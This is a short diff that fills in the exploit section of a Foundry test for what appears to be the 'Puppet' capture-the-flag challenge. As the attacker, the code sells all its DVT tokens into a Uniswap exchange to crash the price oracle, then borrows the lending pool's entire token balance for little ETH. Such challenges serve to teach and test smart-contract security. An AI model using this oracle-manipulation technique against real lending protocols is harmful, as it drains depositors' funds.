@@ -100,6 +100,20 @@ contract Puppet is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+
+        dvt.approve(address(puppetPool), type(uint256).max);
+        dvt.approve(address(uniswapExchange), type(uint256).max);
+
+        uniswapExchange.tokenToEthSwapInput(dvt.balanceOf(attacker), 1, DEADLINE);
+
+        uint256 ethToBorrowOneToken = puppetPool.calculateDepositRequired(1e18);
+
+        // uint256 howMuchWeCanBorrow =  attacker.balance * 10**18 / ethToBorrowOneToken;
+
+        uint256 dvtTokensAvailable = dvt.balanceOf(address(puppetPool));
+
+        puppetPool.borrow{value: attacker.balance}(dvtTokensAvailable);
 
         /**
          * EXPLOIT END *
